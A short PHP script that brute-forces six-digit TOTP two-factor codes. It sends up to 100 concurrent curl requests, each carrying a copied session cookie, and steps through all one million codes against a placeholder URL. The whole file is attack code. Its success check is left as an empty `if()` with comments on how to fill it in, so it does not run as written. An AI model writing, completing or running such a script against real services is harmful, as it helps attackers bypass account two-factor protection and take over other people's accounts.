<?php
$contador = 0;	// Count
$hilos = 100;	// Threads sorry by the spanglish code
$i = 0;
$mh = curl_multi_init();
$options = [
	CURLOPT_URL => "",
	CURLOPT_HEADER => true,
	CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0",	//Change this is you want
	CURLOPT_COOKIE => "NAME=VALUE;",	//Change this
	CURLOPT_RETURNTRANSFER => true,
];	
$i = 0;
while($i < $hilos)	{
	$ch = curl_init();
	$options[CURLOPT_URL] = "https://example.com/?TOTP=".sprintf("%06d",$contador);
	curl_setopt_array($ch,$options);
	curl_multi_add_handle($mh,$ch);
	$contador++;
	$i++;
}
$continue = true;
do {
	while(($execrun = curl_multi_exec($mh, $running)) == CURLM_CALL_MULTI_PERFORM);
		if($execrun != CURLM_OK)
			break;
	$status = curl_multi_exec($mh, $active);
	while($done = curl_multi_info_read($mh))	{
		$r = curl_multi_getcontent($done['handle']);
		$url = curl_getinfo ( $done['handle'],CURLINFO_EFFECTIVE_URL  );
		echo explode("?",$url)[1]."\n";
		echo $r;
		if()	{ //valod Reply
		/*
			Here we need to evaluate the reply some servers send 404 with invalid code
			But anothers servers send 200 with an HTML error message you need to figure what kind of reply expecto to know if is valid or not.
			
		*/
			$continue = false;	//
			//exit; 
		}
		if($contador < 1000000 && $continue)	{
			$ch = curl_init();
			$options[CURLOPT_URL] = "https://example.com/?TOTP=".sprintf("%06d",$contador);
			$contador++;
			curl_setopt_array($ch,$options);
			curl_multi_remove_handle($mh, $done['handle']);
			curl_multi_add_handle($mh,$ch);
		} 
	}
} while ($running);
curl_multi_close($mh);
?>